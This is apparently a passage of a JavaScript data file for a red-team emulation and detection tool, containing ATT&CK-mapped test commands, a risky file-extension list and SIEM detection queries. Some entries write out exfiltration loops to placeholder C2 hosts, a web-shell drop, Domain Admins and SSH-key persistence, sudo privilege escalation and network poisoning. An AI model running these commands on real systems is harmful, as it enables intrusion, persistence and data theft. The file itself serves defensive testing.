    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['CreationTime', 'LastAccessTime', 'timestomp']
  },
  {
    id: 'T1055.001-1',
    technique: 'T1055.001',
    techniqueName: 'Process Injection: Dynamic-link Library Injection',
    tactic: 'Defense Evasion',
    name: 'DLL Injection via CreateRemoteThread',
    description: 'Injects DLL into remote process',
    platforms: ['windows'],
    executor: 'C:\AtomicRedTeam\atomics\T1055\bin\x64\T1055.exe',
    executorType: 'command_prompt',
    elevationRequired: false,
    dependencies: ['AtomicRedTeam binaries'],
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['CreateRemoteThread', 'LoadLibrary', 'VirtualAllocEx']
  },
  {
    id: 'T1055.011-1',
    technique: 'T1055.011',
    techniqueName: 'Process Injection: Extra Window Memory Injection',
    tactic: 'Defense Evasion',
    name: 'Extra Window Memory Injection',
    description: 'Injects code via extra window memory',
    platforms: ['windows'],
    executor: 'C:\AtomicRedTeam\atomics\T1055.011\bin\x64\T1055.011.exe',
    executorType: 'command_prompt',
    elevationRequired: false,
    dependencies: ['AtomicRedTeam binaries'],
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['SetWindowLong', 'SendMessage', 'GWLP_HINSTANCE']
  },
  {
    id: 'T1055.013-1',
    technique: 'T1055.013',
    techniqueName: 'Process Injection: Process Doppelgänging',
    tactic: 'Defense Evasion',
    name: 'Process Doppelgänging',
    description: 'Uses Process Doppelgänging technique',
    platforms: ['windows'],
    executor: 'C:\AtomicRedTeam\atomics\T1055.013\bin\x64\T1055.013.exe',
    executorType: 'command_prompt',
    elevationRequired: false,
    dependencies: ['AtomicRedTeam binaries'],
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['NtCreateTransaction', 'RollbackTransaction', 'Doppelgänging']
  },
  {
    id: 'T1134.001-1',
    technique: 'T1134.001',
    techniqueName: 'Access Token Manipulation: Token Impersonation/Theft',
    tactic: 'Defense Evasion',
    name: 'Token Impersonation',
    description: 'Impersonates user token',
    platforms: ['windows'],
    executor: 'C:\AtomicRedTeam\atomics\T1134.001\bin\x64\T1134.001.exe',
    executorType: 'command_prompt',
    elevationRequired: true,
    dependencies: ['AtomicRedTeam binaries'],
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['DuplicateTokenEx', 'ImpersonateLoggedOnUser', 'SetThreadToken']
  },
  {
    id: 'T1134.002-1',
    technique: 'T1134.002',
    techniqueName: 'Access Token Manipulation: Create Process with Token',
    tactic: 'Defense Evasion',
    name: 'Create Process with Token',
    description: 'Creates process with stolen token',
    platforms: ['windows'],
    executor: 'C:\AtomicRedTeam\atomics\T1134.002\bin\x64\T1134.002.exe',
    executorType: 'command_prompt',
    elevationRequired: true,
    dependencies: ['AtomicRedTeam binaries'],
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['CreateProcessWithTokenW', 'LogonUser', 'token duplication']
  },
  {
    id: 'T1134.004-1',
    technique: 'T1134.004',
    techniqueName: 'Access Token Manipulation: Parent PID Spoofing',
    tactic: 'Defense Evasion',
    name: 'Parent PID Spoofing',
    description: 'Spoofs parent process ID',
    platforms: ['windows'],
    executor: 'C:\AtomicRedTeam\atomics\T1134.004\bin\x64\T1134.004.exe',
    executorType: 'command_prompt',
    elevationRequired: false,
    dependencies: ['AtomicRedTeam binaries'],
    difficulty: 'hard',
    impact: 'high',
    detectionIndicators: ['UpdateProcThreadAttribute', 'PROC_THREAD_ATTRIBUTE_PARENT_PROCESS']
  },
  {
    id: 'T1505.001-1',
    technique: 'T1505.001',
    techniqueName: 'Server Software Component: SQL Stored Procedures',
    tactic: 'Persistence',
    name: 'SQL Server CLR Integration',
    description: 'Enables CLR integration in SQL Server',
    platforms: ['windows'],
    executor: 'sqlcmd -Q "sp_configure \'show advanced options\', 1; RECONFIGURE; sp_configure \'clr enabled\', 1; RECONFIGURE;"',
    executorType: 'command_prompt',
    cleanup: 'sqlcmd -Q "sp_configure \'clr enabled\', 0; RECONFIGURE;"',
    elevationRequired: false,
    difficulty: 'hard',
    impact: 'high',
    detectionIndicators: ['clr enabled', 'sp_configure', 'RECONFIGURE']
  },
  {
    id: 'T1505.002-1',
    technique: 'T1505.002',
    techniqueName: 'Server Software Component: Transport Agent',
    tactic: 'Persistence',
    name: 'Exchange Transport Agent',
    description: 'Installs malicious Exchange transport agent',
    platforms: ['windows'],
    executor: 'Install-TransportAgent -Name "AtomicAgent" -TransportAgentFactory "Atomic.Factory" -AssemblyPath "C:\Atomic\Agent.dll"',
    executorType: 'powershell',
    cleanup: 'Uninstall-TransportAgent -Identity "AtomicAgent" -Confirm:$false',
    elevationRequired: true,
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['Install-TransportAgent', 'TransportAgentFactory']
  },
  {
    id: 'T1505.003-1',
    technique: 'T1505.003',
    techniqueName: 'Server Software Component: Web Shell',
    tactic: 'Persistence',
    name: 'Deploy Web Shell',
    description: 'Deploys web shell on IIS server',
    platforms: ['windows'],
    executor: 'New-Item -Path "C:\inetpub\wwwroot\shell.aspx" -Value "<%@ Page Language=\"C#\" %><% System.IO.File.WriteAllText(\"C:\\temp\\test.txt\", \"Atomic\"); %>"',
    executorType: 'powershell',
    cleanup: 'Remove-Item -Path "C:\inetpub\wwwroot\shell.aspx"',
    elevationRequired: true,
    difficulty: 'medium',
    impact: 'critical',
    detectionIndicators: ['.aspx', 'web shell', 'inetpub']
  },
  {
    id: 'T1071.001-2',
    technique: 'T1071.001',
    techniqueName: 'Application Layer Protocol: Web Protocols',
    tactic: 'Command and Control',
    name: 'C2 via HTTP GET',
    description: 'Uses HTTP GET for C2 communication',
    platforms: ['windows'],
    executor: 'Invoke-WebRequest -Uri http://example.com/c2 -Method GET',
    executorType: 'powershell',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['Invoke-WebRequest', 'GET', 'User-Agent']
  },
  {
    id: 'T1071.004-1',
    technique: 'T1071.004',
    techniqueName: 'Application Layer Protocol: DNS',
    tactic: 'Command and Control',
    name: 'C2 via DNS TXT',
    description: 'Uses DNS TXT records for C2',
    platforms: ['windows'],
    executor: 'nslookup -type=txt atomic-c2.com',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['nslookup', 'type=txt', 'DNS C2']
  },
  {
    id: 'T1567.002-1',
    technique: 'T1567.002',
    techniqueName: 'Exfiltration Over Web Service: Exfiltration to Cloud Storage',
    tactic: 'Exfiltration',
    name: 'Exfil to Dropbox',
    description: 'Exfiltrates data to Dropbox',
    platforms: ['windows'],
    executor: 'Invoke-WebRequest -Uri https://content.dropboxapi.com/2/files/upload -Method POST -Headers @{"Authorization"="Bearer token"; "Dropbox-API-Arg"="{\"path\": \"/test.txt\"}"} -Body "sensitive data"',
    executorType: 'powershell',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['dropboxapi.com', 'Authorization: Bearer', 'exfiltration']
  },
  {
    id: 'T1020-1',
    technique: 'T1020',
    techniqueName: 'Automated Exfiltration',
    tactic: 'Exfiltration',
    name: 'Automated Data Exfiltration',
    description: 'Automatically exfiltrates data',
    platforms: ['windows'],
    executor: 'while($true) { Invoke-WebRequest -Uri http://example.com/exfil -Body (Get-Content C:\data.txt) -Method POST; Start-Sleep -Seconds 300 }',
    executorType: 'powershell',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['while($true)', 'Start-Sleep', 'automated exfil']
  },
  {
    id: 'T1048-1',
    technique: 'T1048',
    techniqueName: 'Exfiltration Over Alternative Protocol',
    tactic: 'Exfiltration',
    name: 'Exfil via FTP',
    description: 'Exfiltrates data using FTP',
    platforms: ['windows'],
    executor: 'ftp -s:ftpcommands.txt',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['ftp -s:', 'ftp.exe', 'exfil']
  },
  {
    id: 'T1048.003-1',
    technique: 'T1048.003',
    techniqueName: 'Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol',
    tactic: 'Exfiltration',
    name: 'Exfil via HTTP POST',
    description: 'Exfiltrates data via HTTP POST',
    platforms: ['windows'],
    executor: 'curl -X POST -d @data.txt http://example.com/upload',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['curl', '-X POST', '@data.txt']
  },
  {
    id: 'T1041-1',
    technique: 'T1041',
    techniqueName: 'Exfiltration Over C2 Channel',
    tactic: 'Exfiltration',
    name: 'Exfil via C2',
    description: 'Exfiltrates data over existing C2 channel',
    platforms: ['windows'],
    executor: 'Invoke-WebRequest -Uri http://c2-server.com/collect -Method POST -Body (Get-Process | ConvertTo-Json)',
    executorType: 'powershell',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['Invoke-WebRequest', 'POST', 'c2-server']
  },
  {
    id: 'T1011-1',
    technique: 'T1011',
    techniqueName: 'Exfiltration Over Other Network Medium',
    tactic: 'Exfiltration',
    name: 'Exfil via Bluetooth',
    description: 'Exfiltrates data via Bluetooth',
    platforms: ['windows'],
    executor: 'fsquirt.exe',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'hard',
    impact: 'low',
    detectionIndicators: ['fsquirt.exe', 'Bluetooth', 'OBEX']
  },
  {
    id: 'T1052.001-1',
    technique: 'T1052.001',
    techniqueName: 'Exfiltration Over Physical Medium: Exfiltration over USB',
    tactic: 'Exfiltration',
    name: 'Exfil to USB',
    description: 'Copies data to USB drive',
    platforms: ['windows'],
    executor: 'copy C:\\sensitive-data.txt E:\\',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'high',
    detectionIndicators: ['copy', 'E:\\', 'USB', 'Removable Media']
  },
  {
    id: 'T1560.001-1',
    technique: 'T1560.001',
    techniqueName: 'Archive Collected Data: Archive via Utility',
    tactic: 'Collection',
    name: 'Archive with 7-Zip',
    description: 'Archives data using 7-Zip with password',
    platforms: ['windows'],
    executor: '7z.exe a -psecret C:\temp\archive.7z C:\sensitive-data',
    executorType: 'command_prompt',
    cleanup: 'del C:\temp\archive.7z',
    elevationRequired: false,
    dependencies: ['7-Zip'],
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['7z.exe', '-p', 'archive.7z']
  },
  {
    id: 'T1560.002-1',
    technique: 'T1560.002',
    techniqueName: 'Archive Collected Data: Archive via Library',
    tactic: 'Collection',
    name: 'Archive with PowerShell',
    description: 'Creates archive using PowerShell',
    platforms: ['windows'],
    executor: 'Compress-Archive -Path C:\sensitive-data -DestinationPath C:\temp\archive.zip -CompressionLevel Optimal',
    executorType: 'powershell',
    cleanup: 'Remove-Item C:\temp\archive.zip',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['Compress-Archive', 'archive.zip']
  },
  {
    id: 'T1119-2',
    technique: 'T1119',
    techniqueName: 'Automated Collection',
    tactic: 'Collection',
    name: 'Automated Collection with Script',
    description: 'Uses script to automatically collect files',
    platforms: ['windows'],
    executor: 'Get-ChildItem -Path C:\Users -Include *.pdf,*.docx,*.xlsx -Recurse | ForEach-Object { Copy-Item $_.FullName C:\temp\collection\ }',
    executorType: 'powershell',
    cleanup: 'Remove-Item C:\temp\collection -Recurse',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['Get-ChildItem', '-Include', '*.pdf', 'ForEach-Object']
  },
  {
    id: 'T1113-1',
    technique: 'T1113',
    techniqueName: 'Screen Capture',
    tactic: 'Collection',
    name: 'Screenshot with PowerShell',
    description: 'Captures screenshot using PowerShell',
    platforms: ['windows'],
    executor: 'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait("{PrtSc}");',
    executorType: 'powershell',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'low',
    detectionIndicators: ['SendKeys', '{PrtSc}', 'screenshot']
  },
  {
    id: 'T1125-1',
    technique: 'T1125',
    techniqueName: 'Video Capture',
    tactic: 'Collection',
    name: 'Record Webcam',
    description: 'Records video from webcam',
    platforms: ['windows'],
    executor: 'ffmpeg -f dshow -i video=\"Integrated Webcam\" -t 10 C:\temp\video.mp4',
    executorType: 'command_prompt',
    cleanup: 'del C:\temp\video.mp4',
    elevationRequired: false,
    dependencies: ['ffmpeg'],
    difficulty: 'hard',
    impact: 'high',
    detectionIndicators: ['ffmpeg', 'dshow', 'webcam', 'video=']
  },
  {
    id: 'T1185-1',
    technique: 'T1185',
    techniqueName: 'Man in the Browser',
    tactic: 'Collection',
    name: 'Browser Session Hijacking',
    description: 'Injects into browser process',
    platforms: ['windows'],
    executor: 'C:\AtomicRedTeam\atomics\T1185\bin\x64\T1185.exe',
    executorType: 'command_prompt',
    elevationRequired: false,
    dependencies: ['AtomicRedTeam binaries'],
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['browser injection', 'session hijacking', 'man in the browser']
  },
  {
    id: 'T1557.001-1',
    technique: 'T1557.001',
    techniqueName: 'Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay',
    tactic: 'Credential Access',
    name: 'LLMNR Poisoning',
    description: 'Performs LLMNR poisoning attack',
    platforms: ['windows'],
    executor: 'Responder.py -I eth0 -wrfv',
    executorType: 'command_prompt',
    elevationRequired: true,
    dependencies: ['Responder.py'],
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['Responder', 'LLMNR', 'NBT-NS', 'poisoning']
  },
  {
    id: 'T1557.002-1',
    technique: 'T1557.002',
    techniqueName: 'Adversary-in-the-Middle: ARP Cache Poisoning',
    tactic: 'Credential Access',
    name: 'ARP Spoofing',
    description: 'Performs ARP spoofing attack',
    platforms: ['linux'],
    executor: 'arpspoof -i eth0 -t 192.168.1.1 192.168.1.100',
    executorType: 'bash',
    elevationRequired: true,
    dependencies: ['arpspoof'],
    difficulty: 'hard',
    impact: 'high',
    detectionIndicators: ['arpspoof', 'ARP', 'spoofing']
  },
  {
    id: 'T1484.001-1',
    technique: 'T1484.001',
    techniqueName: 'Domain Policy Modification: Group Policy Modification',
    tactic: 'Defense Evasion',
    name: 'Modify Group Policy',
    description: 'Modifies Group Policy settings',
    platforms: ['windows'],
    executor: 'Set-GPRegistryValue -Name "Default Domain Policy" -Key "HKLM\Software\Policies\Microsoft\Windows\System" -ValueName "EnableScripts" -Type DWord -Value 1',
    executorType: 'powershell',
    cleanup: 'Remove-GPRegistryValue -Name "Default Domain Policy" -Key "HKLM\Software\Policies\Microsoft\Windows\System" -ValueName "EnableScripts"',
    elevationRequired: true,
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['Set-GPRegistryValue', 'Group Policy', 'GPO modification']
  },
  {
    id: 'T1484.002-1',
    technique: 'T1484.002',
    techniqueName: 'Domain Policy Modification: Domain Trust Modification',
    tactic: 'Defense Evasion',
    name: 'Modify Domain Trust',
    description: 'Modifies domain trust relationships',
    platforms: ['windows'],
    executor: 'netdom trust atomic.local /domain:target.local /add',
    executorType: 'command_prompt',
    cleanup: 'netdom trust atomic.local /domain:target.local /remove',
    elevationRequired: true,
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['netdom', 'trust', 'domain trust']
  },
  {
    id: 'T1098.001-1',
    technique: 'T1098.001',
    techniqueName: 'Account Manipulation: Additional Cloud Credentials',
    tactic: 'Persistence',
    name: 'Add Azure AD User',
    description: 'Adds user to Azure AD',
    platforms: ['windows'],
    executor: 'New-AzureADUser -DisplayName "AtomicUser" -PasswordProfile $PasswordProfile -UserPrincipalName "atomic@atomic.onmicrosoft.com" -AccountEnabled $true',
    executorType: 'powershell',
    cleanup: 'Remove-AzureADUser -ObjectId "atomic@atomic.onmicrosoft.com"',
    elevationRequired: true,
    difficulty: 'hard',
    impact: 'high',
    detectionIndicators: ['New-AzureADUser', 'Azure AD', 'cloud account']
  },
  {
    id: 'T1098.002-1',
    technique: 'T1098.002',
    techniqueName: 'Account Manipulation: Exchange Email Delegate Permissions',
    tactic: 'Persistence',
    name: 'Add Mailbox Delegate',
    description: 'Adds delegate to Exchange mailbox',
    platforms: ['windows'],
    executor: 'Add-MailboxPermission -Identity "victim@atomic.com" -User "attacker@atomic.com" -AccessRights FullAccess -InheritanceType All',
    executorType: 'powershell',
    cleanup: 'Remove-MailboxPermission -Identity "victim@atomic.com" -User "attacker@atomic.com" -AccessRights FullAccess -Confirm:$false',
    elevationRequired: true,
    difficulty: 'hard',
    impact: 'high',
    detectionIndicators: ['Add-MailboxPermission', 'FullAccess', 'delegate']
  },
  {
    id: 'T1098.003-1',
    technique: 'T1098.003',
    techniqueName: 'Account Manipulation: Add to Group',
    tactic: 'Persistence',
    name: 'Add to Domain Admins',
    description: 'Adds user to Domain Admins group',
    platforms: ['windows'],
    executor: 'net group "Domain Admins" attacker /add /domain',
    executorType: 'command_prompt',
    cleanup: 'net group "Domain Admins" attacker /delete /domain',
    elevationRequired: true,
    difficulty: 'easy',
    impact: 'critical',
    detectionIndicators: ['net group', 'Domain Admins', '/add']
  },
  {
    id: 'T1098.004-1',
    technique: 'T1098.004',
    techniqueName: 'Account Manipulation: SSH Authorized Keys',
    tactic: 'Persistence',
    name: 'Add SSH Key',
    description: 'Adds SSH authorized key',
    platforms: ['linux'],
    executor: 'echo "ssh-rsa AAAAB3NzaC1... attacker@atomic" >> ~/.ssh/authorized_keys',
    executorType: 'bash',
    cleanup: 'sed -i "/attacker@atomic/d" ~/.ssh/authorized_keys',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'high',
    detectionIndicators: ['authorized_keys', 'ssh-rsa', '.ssh']
  },
  {
    id: 'T1548.001-1',
    technique: 'T1548.001',
    techniqueName: 'Setuid and Setgid',
    tactic: 'Privilege Escalation',
    name: 'Setuid Binary',
    description: 'Creates setuid binary',
    platforms: ['linux'],
    executor: 'chmod u+s /tmp/suid-binary',
    executorType: 'bash',
    elevationRequired: true,
    difficulty: 'easy',
    impact: 'critical',
    detectionIndicators: ['chmod u+s', 'setuid', 'suid']
  },
  {
    id: 'T1548.003-1',
    technique: 'T1548.003',
    techniqueName: 'Sudo and Sudo Caching',
    tactic: 'Privilege Escalation',
    name: 'Sudo Abuse',
    description: 'Abuses sudo for privilege escalation',
    platforms: ['linux'],
    executor: 'sudo -u#-1 /bin/bash',
    executorType: 'bash',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'critical',
    detectionIndicators: ['sudo', 'uid', 'privilege escalation']
  },
  {
    id: 'T1136.001-1',
    technique: 'T1136.001',
    techniqueName: 'Create Account: Local Account',
    tactic: 'Persistence',
    name: 'Create Local User',
    description: 'Creates local user account',
    platforms: ['windows'],
    executor: 'net user atomicuser password123 /add',
    executorType: 'command_prompt',
    cleanup: 'net user atomicuser /delete',
    elevationRequired: true,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['net user', '/add', 'local account']
  },
  {
    id: 'T1136.002-1',
    technique: 'T1136.002',
    techniqueName: 'Create Account: Domain Account',
    tactic: 'Persistence',
    name: 'Create Domain User',
    description: 'Creates domain user account',
    platforms: ['windows'],
    executor: 'net user atomicuser password123 /add /domain',
    executorType: 'command_prompt',
    cleanup: 'net user atomicuser /delete /domain',
    elevationRequired: true,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['net user', '/add /domain', 'domain account']
  }
];

// ==========================================
// LOLGLOBS DATA (Dangerous File Extensions)
// ==========================================

const LOLGLOBS_DATA = [
  {
    extension: ".scr",
    description: "Windows screensaver file - executable format that runs automatically",
    handler: "Shell32.dll",
    risk: "High",
    mitre: ["T1204.001", "T1059.001"],
    detection: ["File creation monitoring for .scr outside System32", "Process creation from .scr files"]
  },
  {
    extension: ".pif",
    description: "Program Information File - legacy shortcut format that can execute commands",
    handler: "Shell32.dll",
    risk: "High",
    mitre: ["T1204.001"],
    detection: ["File creation monitoring for .pif files", "Unusual process execution from .pif"]
  },
  {
    extension: ".hta",
    description: "HTML Application - executes with full trust and can access Windows Script Host",
    handler: "mshta.exe",
    risk: "Critical",
    mitre: ["T1059.007", "T1218.005"],
    detection: ["MSHTA execution from temp directories", "HTA files downloaded from internet"]
  },
  {
    extension: ".chm",
    description: "Compiled HTML Help - can execute JavaScript and VBScript via shortcuts",
    handler: "hh.exe",
    risk: "Medium",
    mitre: ["T1059.007", "T1218.001"],
    detection: ["Remote CHM file access", "HH.exe with suspicious command lines"]
  },
  {
    extension: ".cpl",
    description: "Control Panel Item - can execute code when opened via Control Panel",
    handler: "Shell32.dll / control.exe",
    risk: "High",
    mitre: ["T1218.002"],
    detection: ["Loading of non-standard CPL files", "Registry changes to CPL paths"]
  },
  {
    extension: ".sct",
    description: "Windows Script Component - XML format that can contain script code",
    handler: "regsvr32.exe / scrobj.dll",
    risk: "Critical",
    mitre: ["T1218.010", "T1059.007"],
    detection: ["Regsvr32 loading .sct files", "Remote SCT execution (Squiblytwo)"]
  },
  {
    extension: ".wsf",
    description: "Windows Script File - can contain mix of JScript and VBScript",
    handler: "wscript.exe",
    risk: "Medium",
    mitre: ["T1059.007"],
    detection: ["WSF execution from temp directories", "Remote WSF file execution"]
  },
  {
    extension: ".jse",
    description: "JScript Encoded Script - encoded JavaScript that can evade simple detection",
    handler: "wscript.exe",
    risk: "High",
    mitre: ["T1059.007", "T1027"],
    detection: ["Execution of .jse files", "Wscript with encoded script extensions"]
  },
  {
    extension: ".vbe",
    description: "VBScript Encoded Script - encoded VBScript to evade detection",
    handler: "wscript.exe",
    risk: "High",
    mitre: ["T1059.005", "T1027"],
    detection: ["Execution of .vbe files", "Encoded VBScript usage"]
  },
  {
    extension: ".lnk",
    description: "Windows Shortcut - can execute arbitrary commands and arguments",
    handler: "Shell32.dll",
    risk: "Medium",
    mitre: ["T1204.001", "T1547.001"],
    detection: ["LNK files in startup folders", "LNK with PowerShell/Script targets"]
  },
  {
    extension: ".iqy",
    description: "Excel Web Query - can pull remote data and execute commands",
    handler: "excel.exe",
    risk: "High",
    mitre: ["T1105", "T1204.001"],
    detection: ["IQY files with remote URLs", "Excel making unexpected web connections"]
  },
  {
    extension: ".slk",
    description: "Symbolic Link Spreadsheet - Excel format that can execute commands via DDE",
    handler: "excel.exe",
    risk: "High",
    mitre: ["T1204.001", "T1559.002"],
    detection: ["SLK files with embedded DDE", "Excel executing DDE commands"]
  },
  {
    extension: ".xll",
    description: "Excel Add-in - can execute code when loaded by Excel",
    handler: "excel.exe",
    risk: "Medium",
    mitre: ["T1137.006"],
    detection: ["XLL files loaded from temp directories", "Excel loading unsigned XLL"]
  },
  {
    extension: ".wll",
    description: "Word Add-in - can execute code when loaded by Word",
    handler: "winword.exe",
    risk: "Medium",
    mitre: ["T1137.005"],
    detection: ["WLL files loaded from temp directories"]
  },
  {
    extension: ".msc",
    description: "Microsoft Management Console snap-in - can execute scripts",
    handler: "mmc.exe",
    risk: "Medium",
    mitre: ["T1218.003"],
    detection: ["MMC loading non-standard .msc files", "Suspicious MMC process creations"]
  },
  {
    extension: ".inf",
    description: "Setup Information File - can execute commands via install sections",
    handler: "infdefaultinstall.exe / cmstp.exe",
    risk: "High",
    mitre: ["T1218.003", "T1553.005"],
    detection: ["INF file execution via infdefaultinstall", "CMSTP loading INF files"]
  },
  {
    extension: ".gadget",
    description: "Windows Sidebar Gadget - can execute HTML/Script code",
    handler: "sidebar.exe",
    risk: "Medium",
    mitre: ["T1059"],
    detection: ["Gadget installation on modern Windows", "Sidebar.exe execution"]
  },
  {
    extension: ".application",
    description: "ClickOnce Deployment Manifest - can install and execute applications",
    handler: "dfshim.dll",
    risk: "Medium",
    mitre: ["T1218.011"],
    detection: ["ClickOnce installation from remote sources"]
  },
  {
    extension: ".com",
    description: "Legacy DOS executable format - still supported by Windows",
    handler: "ntvdm.exe / cmd.exe",
    risk: "High",
    mitre: ["T1059"],
    detection: ["Execution of .com files in modern Windows"]
  },
  {
    extension: ".url",
    description: "Internet Shortcut - can point to executable files or remote code",
    handler: "Shell32.dll / ieframe.dll",
    risk: "Medium",
    mitre: ["T1204.001"],
    detection: ["URL files pointing to local executables"]
  }
];

// ==========================================
// RED TEAM / APT DETECTION TEMPLATES
// ==========================================

const RED_TEAM_TEMPLATES = [
  {
    id: 'html-smuggling',
    name: 'HTML Smuggling Detection',
    description: 'Detects HTML files that use blob construction or base64 decoding to deliver payloads',
    category: 'Initial Access',
    severity: 'high',
    mitre: ['T1027', 'T1059.007', 'T1204.001'],
    dataSources: ['Proxy Logs', 'Web Gateway', 'Endpoint File Creation'],
    platforms: {
      splunk: `index=proxy OR index=endpoint (file_name="*.html" OR file_name="*.htm") 
| eval content_length=len(file_content) 
| search (file_content="*Blob*" OR file_content="*base64*" OR file_content="*atob*" OR file_content="*createObjectURL*") 
| stats count by src_ip, file_name, file_hash, user 
| where count > 0`,
      qradar: `SELECT * FROM events 
WHERE (filename ILIKE '%.html' OR filename ILIKE '%.htm') 
AND (payload ILIKE '%Blob%' OR payload ILIKE '%base64%' OR payload ILIKE '%atob%' OR payload ILIKE '%createObjectURL%') 
GROUP BY sourceip, username, Image`,
      logrhythm: `<MPE_Rule>
  <Name>HTML_Smuggling_Detection</Name>
  <Classification>Initial Access</Classification>
  <CommonEvent>HTML Smuggling</CommonEvent>
  <Conditions>
    <Condition>
      <Field>filename</Field>
      <Operator>Contains</Operator>
      <Value>.html,.htm</Value>
    </Condition>
    <Condition>
      <Field>payload</Field>
      <Operator>Regex</Operator>
      <Value>(Blob|base64|atob|createObjectURL)</Value>
    </Condition>
  </Conditions>
</MPE_Rule>`,
      arcsight: `CEF:0|ArcSight|Logger|1.0|HTML-SMUGGLING|HTML Smuggling Detected|7| 
fileName=.html fileContent Blob base64 atob createObjectURL`,
      cortex: `dataset = xdr_data 
| filter event_type = ENUM.FILE_CREATE 
| filter action_file_name contains ".html" or action_file_name contains ".htm" 
| filter action_file_data contains "Blob" or action_file_data contains "base64" or action_file_data contains "atob"`,
      fidelis: `entity_type=file AND (name contains ".html" OR name contains ".htm") AND (file_content contains "Blob" OR file_content contains "base64")`
    }
  },
  {
    id: 'dcom-lateral-movement',
    name: 'DCOM Lateral Movement (MMC20.Application)',
    description: 'Detects abuse of DCOM objects for remote code execution',
    category: 'Lateral Movement',
    severity: 'critical',
    mitre: ['T1021.003', 'T1175'],
    dataSources: ['Windows Security 4688', 'Sysmon 1', 'WMI Activity'],
    platforms: {
      splunk: `index=windows (EventCode=4688 OR EventCode=1) 
| search (CommandLine="*MMC20.Application*" OR CommandLine="*-com*" OR ParentImage="*svchost.exe*" AND Image="*powershell.exe") 
| eval RiskScore=if(match(CommandLine, "(?i)mmc20|dcom|ShellWindows"), 100, 0) 
| where RiskScore > 0 
| stats count by Computer, User, ParentImage, Image, CommandLine`,
      qradar: `SELECT * FROM events 
WHERE LOGSOURCENAME(logsourceid) ILIKE '%Windows%' 
AND (CommandLine ILIKE '%MMC20.Application%' OR CommandLine ILIKE '%ShellExecute%') 
AND ParentImage ILIKE '%svchost.exe%'`,
      logrhythm: `<MPE_Rule>
  <Name>DCOM_Lateral_Movement</Name>
  <Classification>Lateral Movement</Classification>
  <CommonEvent>DCOM Abuse</CommonEvent>
  <Conditions>
    <Condition>
      <Field>CommandLine</Field>
      <Operator>Regex</Operator>
      <Value>(MMC20\.Application|ShellWindows)</Value>
    </Condition>
  </Conditions>
</MPE_Rule>`,
      arcsight: `CEF:0|Microsoft|Windows|1.0|DCOM-LATERAL|DCOM Lateral Movement|10| 
msg=MMC20.Application dcom svchost`,
      cortex: `dataset = xdr_data 
| filter event_type = ENUM.PROCESS_START 
| filter action_process_image_command_line contains "MMC20.Application" or action_process_image_command_line contains "ShellExecute" 
| filter action_process_parent_image_name contains "svchost.exe"`,
      fidelis: `entity_type=process AND (command_line contains "MMC20" OR command_line contains "ShellExecute") AND parent_name contains "svchost.exe"`
    }
  },
  {
    id: 'wmi-persistence',
    name: 'WMI Event Subscription Persistence',
    description: 'Detects creation of WMI event subscriptions for persistence',
    category: 'Persistence',
    severity: 'high',
    mitre: ['T1546.003', 'T1047'],
    dataSources: ['Sysmon 19/20/21', 'Windows WMI Activity', 'PowerShell 4104'],
    platforms: {
      splunk: `index=sysmon (EventCode=19 OR EventCode=20 OR EventCode=21) 
| eval RiskScore=case(
    match(CommandLine, "(?i)ActiveScriptEventConsumer|CommandLineEventConsumer"), 100,
    match(CommandLine, "(?i)__EventFilter.*__EventConsumer"), 90,
    true(), 0) 
| where RiskScore > 0 
| stats count by Computer, User, EventCode, CommandLine`,
      qradar: `SELECT * FROM events 
WHERE EventID IN (19, 20, 21) 
AND (Payload ILIKE '%ActiveScriptEventConsumer%' OR Payload ILIKE '%CommandLineEventConsumer%')`,
      logrhythm: `<MPE_Rule>
  <Name>WMI_Persistence</Name>
  <Classification>Persistence</Classification>
  <CommonEvent>WMI Event Subscription</CommonEvent>
  <Conditions>
    <Condition>
      <Field>EventID</Field>
      <Operator>In</Operator>
      <Value>19,20,21</Value>
    </Condition>
  </Conditions>
</MPE_Rule>`,
      arcsight: `CEF:0|Microsoft|Sysmon|1.0|WMI-PERSIST|WMI Persistence|8| 
eventId=19 eventId=20 eventId=21 ActiveScriptEventConsumer`,
      cortex: `dataset = xdr_data 
| filter event_type = ENUM.WMI_CREATION 
| filter action_wmi_consumer_type in ("ActiveScriptEventConsumer", "CommandLineEventConsumer")`,
      fidelis: `entity_type=process AND (command_line contains "ActiveScriptEventConsumer" OR command_line contains "CommandLineEventConsumer")`
    }
  },
  {
    id: 'amsi-bypass',
    name: 'AMSI Bypass Detection',
